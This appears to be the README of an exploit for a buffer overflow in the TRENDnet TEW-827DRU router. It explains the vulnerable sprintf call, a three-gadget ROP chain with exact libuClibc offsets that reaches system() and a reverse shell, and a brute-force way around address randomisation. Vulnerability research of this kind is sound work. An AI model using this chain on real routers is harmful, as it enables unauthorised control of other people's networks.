## CVE NUMBER HERE

This script exercises an authenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect to
a reverse shell.

The vulnerability is a buffer overflow when processing an error message to inform the user about failing to resolve
the provided hostname. The string:

`"echo \"ping: %s Unable to resolve, check that the name is correct" > %s"`

is passed to `sprintf`. The first %s is filled with the value in `ip_addr` field, the second is the static string
/tmp/diagnostic.

```
LOAD:00439604    addiu   $v0, (aEchoPingSUnabl - 0x4C0000)  # "echo \"ping: %s Unable to resolve, check that the name is correct\" > %s"
LOAD:00439608    addiu   $v1, $fp, 0x258+var_224
LOAD:0043960C    move    $a0, $v1         # s
LOAD:00439610    move    $a1, $v0         # format
LOAD:00439614    lw      $a2, 0x258+cp($fp)
LOAD:00439618    la      $v0, aTDelay     # "t_delay"
LOAD:0043961C    nop
LOAD:00439620    addiu   $a3, $v0, (aTmpDiagnostic - 0x4C0000)  # "/tmp/diagnostic"
LOAD:00439624    la      $v0, sprintf
LOAD:00439628    nop
LOAD:0043962C    move    $t9, $v0
LOAD:00439630    jalr    $t9 ; sprintf
LOAD:00439634    nop
```

Pseudo Code:
```
sprintf(var_224, "echo \"ping: %s Unable to ...\" > %s", ip_addr, "/tmp/diagnostic");
```

## ROP Gadgets
The same ROP chain is used for every exploit and all gadgets come from `libuClibc-0.9.33.2.so`. The cgi file that 
contains the exploit was compiled with library randomization enabled meaning it is loaded at a random address each time 
it is run. Because of this the exploit must be repeatedly thrown until `libuClibc` gets loaded at the address used as 
the base in the exploit. Sometimes this is quick, sometimes it takes a few minutes. A valid load address was found 
through UART debugging and repeatedly throwing the exploit until one of the processes blocked. Once the process was 
blocked I examined the process mapping and used the loaded address of `libuClibc` for the base in all the exploits. 

The ROP chain used in the exploit is shown below.

#### ROP1
This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
and $v1 to move arguments around. Because of this the functions that contain the exploit only save `$fp` and `$ra` which is 
kinda hard to make useful chains with one registers. The first rop gadget gives us control of `$s0` - `$s6` to give us a 
larger variety of gadgets.

#### ROP2
The address of system ends in 0x20, ASCII for space, which we can't send in the URL without encoding. So, we replace the 0x20 
with 0x1C and use this gadget to increment the address of system to the proper address.

#### ROP3
Grab a string off the stack and call system with it.

```

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  | $ra will be address of ROP2
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                | Address of system is in $s3
|             |               | move    $t9, $s5              | Address of ROP3 in $s5
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 | Command is on the stack at this offset.
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              | Move system to $t9
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

```

## Example Output
![Example Output](./img/ping_overflow.png)
